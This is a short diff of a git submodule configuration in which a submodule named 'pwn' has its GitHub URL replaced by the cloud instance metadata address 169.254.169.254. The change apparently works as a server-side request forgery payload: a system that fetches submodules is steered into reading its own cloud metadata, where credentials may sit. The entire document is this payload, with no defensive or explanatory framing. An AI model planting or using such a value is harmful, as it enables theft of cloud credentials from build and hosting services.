@@ -1,3 +1,3 @@
 [submodule "pwn"]
   path = pwn
-  url = https://github.com/foxer9112/musawerk.github.io
+  url = http://169.254.169.254/latest/meta-data/
